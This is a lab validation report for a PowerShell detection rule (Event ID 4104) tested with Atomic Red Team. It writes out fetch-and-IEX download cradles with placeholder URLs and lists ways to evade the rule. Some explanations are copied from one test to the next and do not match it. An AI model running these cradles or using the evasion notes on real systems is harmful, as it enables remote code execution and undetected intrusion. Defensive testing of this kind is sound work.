# Validation — T1059.001 PowerShell Execution

> **Rule**: `rule.kql` / `rule.spl` (Rule B — EID 4104 script block content)
> **Test date**: 2026-06-24
> **Lab host**: LAB-WIN11-01 (Windows 11 22H2, synthetic hostname)
> **Emulation tool**: Atomic Red Team (Invoke-AtomicRedTeam)
> **Sysmon version**: 15.14

---

## Pre-conditions

- Windows Event ID 4104 enabled via registry (`HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` → `EnableScriptBlockLogging = 1`).
- Splunk running locally, ingesting Windows Event logs via Sysmon/WEC forwarding.

---

## Test Results

Rule A (EID 1 / process creation) was deprioritised; all tests below evaluate **Rule B only** (EID 4104 script block content).

| # | Atomic Test | Description | Rule B fires? | Notes |
|---|---|---|---|---|
| 6 | T1059.001-6 | MsXml COM object download + IEX | Yes | Alert fired: Medium — in-memory execution detected |
| 7 | T1059.001-7 | PowerShell XML requests (`[xml]` type accelerator) | YES | XML fetch mechanism not in current keyword list |
| 10| T1059.001-9 | Invoke-download cradle | Rule B fires | Yes | Alert fired: High, medium & informational throughout the different subscripts involved| 
---

## Test 6 — MsXml COM Object (PASS)

**Command emulated:**
```powershell
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','<url>',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
```

**Alert fired**: Yes — Severity **Medium**, DetectionReason: `In-memory execution (IEX / ScriptBlock::Create)`

**Why it fired**: The EID 4104 script block contained `IEX`, which matched the in-memory execution signal. The fetch via `MsXml2.ServerXmlHttp` was not itself matched (COM-based fetches are not in the current primitive list), but the `IEX` call on the response was sufficient to trigger the Medium tier.

**Why not High**: A High alert requires a fetch primitive AND in-memory execution to appear together in the same block. Because the COM object fetch did not match any recognised fetch keyword, only the memory signal scored — resulting in Medium rather than High.

---

## Test 7 — PowerShell XML Requests (Pass)

**Command emulated:**
```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
```
**Alert fired**: Yes - Severity **Medium**, In-memory execution (IEX)

**Why it fired**: The EID 4104 script block contained `IEX`, which matched the in-memory execution signal. The fetch via `MsXml2.ServerXmlHttp` was not itself matched (COM-based fetches are not in the current primitive list), but the `IEX` call on the response was sufficient to trigger the Medium tier.

**Why not High**: A High alert requires a fetch primitive AND in-memory execution to appear together in the same block. Because the COM object fetch did not match any recognised fetch keyword, only the memory signal scored — resulting in Medium rather than High.

---
## Test 9 - PowerShell invoke download cradle test script
**Command emulated* 
Entire Invoke-DownloadCradle test script- https://github.com/mgreen27/mgreen27.github.io
**Alert fired**: Yes - Severity **High/Medium** Download cradle & in memory execution (IEX)
**Why it fired**: The EID 4104 block caught all of the download cradle syntax that was fired, raising multiple alerts (several scripts were ran) at the desired severities.

---

## Outcome

The detection covers a **narrow slice** of the PowerShell execution surface. It correctly identifies the most common IEX-based in-memory execution pattern, but it is evasable:

- Any fetch mechanism outside the current primitive list (COM objects alone, XML requests, raw .NET reflection without named cmdlets) avoids the download signal.
- A cradle that delivers its payload without `IEX` or `[ScriptBlock]::Create` (e.g. direct `.Invoke()` on a compiled assembly) avoids the memory signal entirely.
- The High tier specifically requires both signals to co-occur; an attacker who splits fetch and execution across separate script blocks drops the alert to Medium or suppresses it.

**V2 scope**: Broaden the fetch primitive list to cover COM-based HTTP clients (`MsXml2.ServerXmlHttp`, `MSXML2.XMLHTTP`, `WinHttp.WinHttpRequest`), raw .NET `HttpClient`/`HttpWebRequest`, and XML-type-accelerator patterns. Explore matching against `ScriptBlockId` chains to correlate split blocks from the same session and recover the fused-cradle High tier even when the attacker separates fetch and execution.
